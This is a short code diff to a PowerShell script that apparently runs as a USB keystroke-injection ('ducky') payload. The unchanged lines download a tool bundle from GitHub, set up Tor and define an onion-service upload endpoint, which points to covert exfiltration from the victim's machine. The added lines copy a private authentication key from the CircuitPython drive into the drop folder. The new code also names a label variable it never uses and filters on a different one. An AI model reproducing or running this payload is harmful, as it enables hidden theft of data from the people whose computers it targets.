@@ -7,6 +7,14 @@ $curlPath = "$dropPath\tools\curl\bin\curl.exe"
 $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
 $uploadURL = $onionURL + "/upload.php"
 $logFile = "$dropPath\tools\tor\tor.log"
+$duckyLabel = "CIRCUITPY"
+$privKeyDest = $dropPath + "\auth\auth.private"
+
+$drive = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
+
+$drivePath = "$($drive.DriveLetter):\"
+
+$privKey = $drivePath + "\auth.private"
 
 # Set the download URL
 $toolsURL = "https://raw.githubusercontent.com/barksploit/ducky/refs/heads/master/tools.zip"
@@ -22,6 +30,8 @@ Invoke-WebRequest -Uri $toolsURL -OutFile $zipFile
 
 # Extract it
 Expand-Archive -Path $zipFile -DestinationPath $dropPath -Force
+
+Move-Item -Path $privKey -Destination $privKeyDest
 
 Set-Content -Path $torrcPath -Value @"
 SocksPort 9050
